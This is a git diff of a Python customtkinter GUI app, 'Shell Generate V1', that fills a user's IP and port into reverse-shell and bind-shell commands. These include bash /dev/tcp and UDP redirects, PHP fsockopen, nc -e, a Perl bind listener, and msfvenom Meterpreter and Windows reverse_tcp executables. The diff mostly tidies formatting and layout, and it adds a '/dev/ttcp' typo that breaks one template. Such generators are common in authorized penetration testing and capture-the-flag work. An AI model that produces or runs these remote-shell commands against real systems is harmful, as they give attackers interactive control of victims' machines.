@@ -1,14 +1,11 @@
 import customtkinter as cutk
-import emoji # Not working at the moment
-
-
+import emoji  # Not working at the moment
 
 PORT = int()
-IP = str("Your_IP")
-SHELL = "bash" # By default is `bash`
+IP = str("Your IP")
+SHELL = "bash"  # By default is `bash`
 shell_option = ["/bin/sh", "bash", "/bin/bash", "cmd", "powershell", "pwsh", "ash", "bsh", "csh", "ksh", "zsh", "pdksh", "tcsh", "mksh", "dash"]
 
-# Function to clear the scrollable frame
 def clear_frame(frame):
     for widget in frame.winfo_children():
         widget.destroy()
@@ -27,7 +24,6 @@ def get_the_port_from_user(event):
     global PORT
     PORT = port_entry.get()
     print(f"nc -lvnp {PORT}")
-    # print(emoji.emojize('Python is fun :smile:', use_aliases=True)) # TO DO maybe
     if int(PORT) < 1000:
         listent_label.configure(text=f"sudo nc -lvnp {PORT}")
     else:
@@ -44,13 +40,13 @@ def ret_bash_i():
     shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")
 
 def ret_bash_196():
-    shell_label.configure(text=f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {SHELL} <&196 >&196 2>&196")
+    shell_label.configure(text=f"0<&196;exec 196<>/dev/ttcp/{IP}/{PORT}; {SHELL} <&196 >&196 2>&196")
 
 def ret_bash_read_line():
     shell_label.configure(text=f"exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done")
 
 def ret_bash_5():
-    shell_label.configure(text=f"{SHELL} -i 5<> /dev/tcp/{IP}/{PORT} 0<&5 1>&5 2>&5") 
+    shell_label.configure(text=f"{SHELL} -i 5<> /dev/tcp/{IP}/{PORT} 0<&5 1>&5 2>&5")
 
 def ret_bash_UDP():
     shell_label.configure(text=f"{SHELL} -i >& /dev/udp/{IP}/{PORT} 0>&1")
@@ -97,8 +93,8 @@ def show_bind_shell():
     clear_frame(scrollable_frame)
     buttons = [
         ("Python Bind", ret_python_bind),
-        ("PHP Bind", lambda: shell_label.configure(text=f"php -r '$sock=fsockopen(\"{IP}\",{PORT});exec(\"{SHELL} -i <&3 >&3 2>&3\");'")),
-        ("nc Bind", lambda: shell_label.configure(text=f"nc -lvnp {PORT} -e /bin/sh")),
+        ("PHP Bind", lambda: shell_label.configure(text="php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'")),
+        ("nc Bind", lambda: shell_label.configure(text="nc -lvnp PORT -e /bin/sh")),
         ("Perl Bind", lambda: shell_label.configure(text="perl -e 'use Socket;$d=socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));$d->bind(INADDR_ANY,PORT);listen($d,5);while(accept(C,$d)){while(<C>){exec($_);}}'"))
     ]
     for text, command in buttons:
@@ -108,10 +104,10 @@ def show_bind_shell():
 def show_msfvenom_shell():
     clear_frame(scrollable_frame)
     buttons = [
-        ("Windows\n Meterpreter\n staged reverse\n TCP(x64)", lambda: shell_label.configure(text=f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe")),
-        ("Windows\n Meterpreter\n stageless reverse\n TCP(x64)", lambda: shell_label.configure(text=f"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe")),
-        ("Windows\n Staged reverse\n TCP", lambda: shell_label.configure(text=f"msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe")),
-        ("Windows\n Stageless reverse\n TCP", lambda: shell_label.configure(text=f"msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe"))
+        ("Windows\n Meterpreter\n staged reverse\n TCP(x64)", lambda: shell_label.configure(text="msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe")),
+        ("Windows\n Meterpreter\n stageless reverse\n TCP(x64)", lambda: shell_label.configure(text="msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe")),
+        ("Windows\n Staged reverse\n TCP", lambda: shell_label.configure(text="msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe")),
+        ("Windows\n Stageless reverse\n TCP", lambda: shell_label.configure(text="msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe"))
     ]
     for text, command in buttons:
         button = cutk.CTkButton(master=scrollable_frame, text=text, command=command, fg_color="gray", hover_color="red")
@@ -121,19 +117,17 @@ cutk.set_appearance_mode("dark")
 cutk.set_default_color_theme("blue")
 
 app = cutk.CTk()
-app.geometry("900x700")
+app.geometry("900x600")
 app.title("Shell Generate V1")
 
 app.grid_rowconfigure(0, weight=1)
 app.grid_columnconfigure(0, weight=1)
 
 main_frame = cutk.CTkFrame(master=app) 
-main_frame.grid(pady=30,padx=30, row=0, column=0, sticky='nsew')
+main_frame.grid(pady=30, padx=30, row=0, column=0, sticky='nsew')
 
 main_label = cutk.CTkLabel(master=main_frame, text='Shell Generator', font=("Roboto", 32))
-main_label.grid(pady=10, padx=10,row=0, columnspan=2, sticky='nsew')
-API_check_CVE = cutk.CTkButton(master=main_frame,text="CVE Check")
-API_check_CVE.grid(pady=10, padx=10,row=0, column=2, sticky='nsew')
+main_label.grid(pady=10, padx=10, row=0, columnspan=2, sticky='nsew')
 
 ip_port_frame = cutk.CTkFrame(master=main_frame, corner_radius=10)
 ip_port_frame.grid(pady=10, padx=10, row=1, column=0, sticky='nsew')
@@ -145,14 +139,14 @@ ip_port_label = cutk.CTkLabel(master=ip_port_frame, text="IP & Port")
 ip_port_label.grid(padx=10, pady=10, row=0, column=0)
 
 ip_entry = cutk.CTkEntry(master=ip_port_frame, placeholder_text="Enter IP")
-ip_entry.grid(padx=10, pady=10,row=1, column=0)
+ip_entry.grid(padx=10, pady=10, row=1, column=0)
 ip_entry.bind("<Return>", get_the_ip_from_user)
 
 port_entry = cutk.CTkEntry(master=ip_port_frame, placeholder_text="Port")
-port_entry.grid( padx=10, pady=10, row=1, column=1)
+port_entry.grid(padx=10, pady=10, row=1, column=1)
 port_entry.bind("<Return>", get_the_port_from_user)
 
-listent_frame = cutk.CTkFrame(master=main_frame, corner_radius=10,)
+listent_frame = cutk.CTkFrame(master=main_frame, corner_radius=10)
 listent_frame.grid(pady=10, padx=10, row=1, column=1, sticky='nsew')
 listent_frame.grid_rowconfigure(0, weight=1)
 listent_frame.grid_columnconfigure(0, weight=1)
@@ -160,40 +154,37 @@ listent_frame.grid_columnconfigure(0, weight=1)
 listent_label = cutk.CTkLabel(master=listent_frame, text="Listener")
 listent_label.grid(pady=10, padx=10)
 
-listent_label = cutk.CTkLabel(master=listent_frame, width=320, text=f"nc -lvnp {PORT}" )
+listent_label = cutk.CTkLabel(master=listent_frame, width=320, text=f"nc -lvnp {PORT}")
 listent_label.grid()
 
-
 shell_frame = cutk.CTkFrame(master=main_frame, corner_radius=10)
-shell_frame.grid(row=2,columnspan=2, sticky='nsew', padx=10, pady=10)
+shell_frame.grid(row=2, columnspan=2, sticky='nsew', padx=10, pady=10)
 shell_frame.grid_rowconfigure(0, weight=1)
 shell_frame.grid_columnconfigure(0, weight=1)
 
-revers_shell = cutk.CTkButton(master=shell_frame, command=show_reverse_shell, text="Reverse",fg_color="gray", hover_color="blue", corner_radius=10)
+revers_shell = cutk.CTkButton(master=shell_frame, command=show_reverse_shell, text="Reverse", fg_color="gray", hover_color="blue", corner_radius=10)
 revers_shell.grid(row=0, column=0)
 bind_shell = cutk.CTkButton(master=shell_frame, command=show_bind_shell, text="Bind", fg_color="gray", hover_color="blue", corner_radius=10)
 bind_shell.grid(row=0, column=1)
-MSF_venom = cutk.CTkButton(master=shell_frame,command=show_msfvenom_shell, text="MSFVenom",fg_color="gray", hover_color="blue", corner_radius=10)
+MSF_venom = cutk.CTkButton(master=shell_frame, command=show_msfvenom_shell, text="MSFVenom", fg_color="gray", hover_color="blue", corner_radius=10)
 MSF_venom.grid(row=0, column=2)
 
-
 scrollable_frame = cutk.CTkScrollableFrame(master=shell_frame, width=150, height=150)
-scrollable_frame.grid(row=1,column=0)
+scrollable_frame.grid(row=1, column=0)
 
+copy_frame = cutk.CTkFrame(master=shell_frame, corner_radius=10)
+copy_frame.grid(row=1, column=1)
 
-#copy_frame = cutk.CTkFrame(master=shell_frame, corner_radius=10,)
-#copy_frame.grid(row=1,column=1)
-
-shell_label = cutk.CTkLabel(master=shell_frame, text="Enter your IP and Port PLS!!! 😄", font=("Aria", 20), wraplength=500)
-shell_label.grid(row=1, column=1 ,columnspan=2)
-#shell_label.columnconfigure(1, weight=2)
+shell_label = cutk.CTkLabel(master=copy_frame, text="Enter your IP and Port PLS!!! 😄", font=("Aria", 20), wraplength=400)
+shell_label.grid(row=2, columnspan=2)
 
 copy_button = cutk.CTkButton(main_frame, text="Copy to Clipboard", command=copy_to_clipboard)
-copy_button.grid( row=3, column=1, pady=(10, 0), sticky='ew')
+copy_button.grid(row=3, column=1, pady=(10, 0), sticky='ew')
 
 option_menu = cutk.CTkOptionMenu(master=shell_frame, values=shell_option, command=set_shell)
-option_menu.grid(row=3, column=3, pady=20, padx=20) 
+option_menu.grid(row=3, column=3, pady=20, padx=20)
 
 meme_button = cutk.CTkButton(master=main_frame, text="Easter Egg")
 meme_button.grid(row=3, column=0, pady=(10, 0), sticky='ew')
+
 app.mainloop()
